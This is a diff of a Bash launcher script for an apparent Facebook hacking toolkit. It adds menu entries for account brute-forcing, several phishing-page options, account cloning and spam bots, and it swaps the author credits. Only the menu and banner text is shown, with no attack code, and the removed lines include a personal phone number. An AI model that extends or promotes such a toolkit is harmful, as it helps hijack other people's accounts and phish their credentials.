@@ -14,15 +14,35 @@ echo
 echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
 echo $i" |"$cy" D6X mu6tx"$i"                                    |"
 echo $i" |"$me"──────────────────────────────────────────────"$i"|"
-echo $i" |"$pu" by:"$ku" mu6tx"$i"                                    |"
-echo $i" |"$pu" telegram channel:"$ku" https://t.me/D6X_mu6tx"$i"     |"
+echo $i" |"$pu" by:"$ku" mu6tx"$i"                               |"
+echo $i" |"$pu" telegram channel:"$ku" https://t.me/D6X_mu6tx"$i"|"
 echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
 echo
 echo $i"────────────────────────────────    ─────"
-echo $i"|"$me" 1"$i" |"$cy" REPORT FACEBOOK WORK     "$i"|"$i"    |"$cy" A"$i" |"
+echo $i"|"$me" 1"$i" |"$cy" BRUTEFORCE FB PHP        "$i"|"$i"    |"$cy" B"$i" |"
+echo $i"|"$me" 2"$i" |"$cy" BRUTEFORCE FB BR1G4D3    "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me" 3"$i" |"$cy" BRUTEFORCE FB iqbalz     "$i"|"$i"    |"$cy" N"$i" |"
+echo $i"|"$me" 4"$i" |"$cy" BRUTEFORCE FB MBF        "$i"|"$i"    |"$cy" G"$i" |"
+echo $i"|"$me" 5"$i" |"$cy" FACEBRUTE N1ght420       "$i"|"$i"    |"$cy" K"$i" |"
+echo $i"|"$me" 6"$i" |"$cy" BRUTEFORCE FB ( root )   "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"────────────────────────────────"$i"    |"$cy" L"$i" |"
+echo $i"|"$me" 7"$i" |"$cy" YAHOO CLONING FACEBOOK   "$i"|"$i"    ─────"
+echo $i"|"$me" 8"$i" |"$cy" PROFILE GUARD FACEBOOK   "$i"|"$i"    |"$cy" F"$i" |"
+echo $i"|"$me" 9"$i" |"$cy" REPORT FACEBOOK WORK     "$i"|"$i"    |"$cy" A"$i" |"
+echo $i"|"$me"10"$i" |"$cy" AUTO REACTION FACEBOOK   "$i"|"$i"    |"$cy" C"$i" |"
+echo $i"|"$me"11"$i" |"$cy" INFORMATION FACEBOOK     "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"|"$me"12"$i" |"$cy" BOT KOMEN FACEBOOK       "$i"|"$i"    |"$cy" B"$i" |"
+echo $i"|"$me"13"$i" |"$cy" AUTOLIKE FACEBOOK        "$i"|"$i"    |"$cy" O"$i" |"
+echo $i"────────────────────────────────"$i"    |"$cy" O"$i" |"
+echo $i"|"$me"14"$i" |"$cy" PHISING FACEBOOK 1       "$i"|"$i"    |"$cy" K"$i" |"
+echo $i"|"$me"15"$i" |"$cy" PHISING FACEBOOK 2       "$i"|"$i"    ─────"
+echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" K"$i" |"
+echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" E"$i" |"
+echo $i"────────────────────────────────"$i"    |"$cy" R"$i" |"
+echo $i"|"$me"18"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" N"$i" |"
 echo $i"────────────────────────────────    ─────"
 echo
-echo $me"┌==="$bi"["$i"mu6tx"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
+echo $me"┌==="$bi"["$i"FR13ND8"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
 echo $me"¦"
 read -p"└──# " pil
 
@@ -228,11 +248,11 @@ figlet -f slant "E X I T"|lolcat
 sleep 2
 echo $cy"Terima Kasih Sudah Pakai Tool Saya"
 sleep 2
-echo $i"Bila Ada Kesalahan Kamu Bisa Nanya Kepada Saya"
+echo $i"D6X "
 sleep 2
-echo $ku"WhatsApp :"$i" 085835787069"
-echo $ku"Facebook :"$i" Riski Darmawan"
+echo $ku"telegram :"$i" @mu6tx"
+echo $ku"telegram channel :"$i" https://t.me/D6X_mu6tx"
 sleep 2
-echo $pur">> Thanks Yang Sudah Support Saya <<"
+echo $pur">> Thanks  <<"
 exit
 fi
